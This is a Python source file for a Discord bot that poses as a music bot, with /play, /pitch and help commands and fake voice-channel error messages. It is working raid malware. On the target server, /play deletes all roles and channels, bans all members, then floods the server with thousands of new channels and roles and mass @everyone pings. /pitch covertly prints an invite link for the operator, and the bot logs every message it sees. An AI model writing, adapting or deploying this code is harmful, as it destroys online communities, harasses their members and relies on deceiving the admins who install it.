import os, discord, random, time
from discord import interactions

token = "Token" #Bot token here
raidID = 0 #Server ID to be raided

start_message = "nooo" #primary message
spam_message = "https://youtu.be/WnVltopWrfY" #The message to be spammed 3 times per channel along with a ping
bot_status = "Running on 5258 servers!" #Bot statussss
possible_names = ["L"] #The possible names of the new channels and roles created

class myClient(discord.Client):
    def __init__(self, *, intents):
        super().__init__(intents = intents)
        self.tree = discord.app_commands.CommandTree(self)

    async def setup_hook(self):
        await self.tree.sync(guild = None)

client = myClient(intents = discord.Intents.all())
start_time = time.time()

def main():
    os.system("cls")

    @client.event
    async def on_ready():
        print("https://discord.com/api/oauth2/authorize?client_id={}&scope=applications.commands%20bot".format(client.user.id))

        activity = discord.Activity(type=discord.ActivityType.listening, name=bot_status, bot_status=discord.Status.idle)
        await client.change_presence(activity=activity)

        print("> Bot started in {} seconds".format((time.time() - start_time)))

    async def proccess_reponse(interaction: interactions.Interaction):
        if interaction.guild_id == raidID:
            for x in list(interaction.guild.roles):
                try:
                    await x.delete()
                except:
                    pass

            for x in list(interaction.guild.channels):
                try:
                    await x.delete()
                except:
                    break

            for x in list(interaction.guild.members):
                try:
                    await x.ban()
                except:
                    pass
            
            embed = discord.Embed(color=discord.Color.blue(), title="The server has been raided!!! oh no!!!", description=start_message)
            embed.set_image(url="https://i.pinimg.com/originals/9e/99/77/9e9977f938d1c2f09efa33aefb7b6fd6.gif")

            category = await interaction.guild.create_category("Information")
            information_channel = await interaction.guild.create_text_channel(category=category, name="Server status")

            await information_channel.send(embed=embed)

            spam_category = await interaction.guild.create_category("Raid")
            
            for _ in range(0, 10000):
                try:
                    guild = client.get_guild(interaction.guild_id)
                    channel = await guild.create_text_channel(category=spam_category, name=random.choice(possible_names))

                    await interaction.guild.create_role(name=random.choice(possible_names))
                    
                    for x in range(0, 3):
                        to_send = client.get_channel(channel.id)
                        await to_send.send("{} @everyone @here".format(spam_message))
                except:
                    break
        else:
            embed = discord.Embed(color=discord.Color.red(), title="Error!!!", description="Error trying to perform action, are you sure you are on a voice channel?")
            await interaction.response.send_message(embed=embed)

    @client.tree.command(name="play", description="Play the song you want via a URL within a voice chat!")
    async def play(interaction: interactions.Interaction):
        await proccess_reponse(interaction)
    
    @client.tree.command(name="pitch", description="Adjust the pitch of the song you are listening to")
    async def pitch(interaction: interactions.Interaction):
        embed = discord.Embed(color=discord.Color.red(), title="Error!!!", description="Error trying to perform action, are you sure you are on a voice channel?")

        try:
            link = await interaction.channel.create_invite(max_age=300)
            print("> Invite : {}".format(link))
        except:
            pass

        await interaction.response.send_message(embed=embed)
    
    @client.tree.command(name="help", description="Information about the bot and its commands")
    async def help(interaction: interactions.Interaction):
        embed = discord.Embed(color=discord.Color.green(), title="Commands")

        embed.add_field(name="/play", value="Play the song you want via a URL within a voice chat! (it can only be done with youtube urls)")
        embed.add_field(name="/pitch", value="Adjust the pitch of the song you are listening to")

        await interaction.response.send_message(embed=embed)
    
    @client.event
    async def on_message(msg: discord.Message):
        if msg.author != client.user:
            print("> {} | {} : {}".format(msg.channel.name, msg.author.name, msg.content))

if __name__ == "__main__":
    main()

client.run(token)
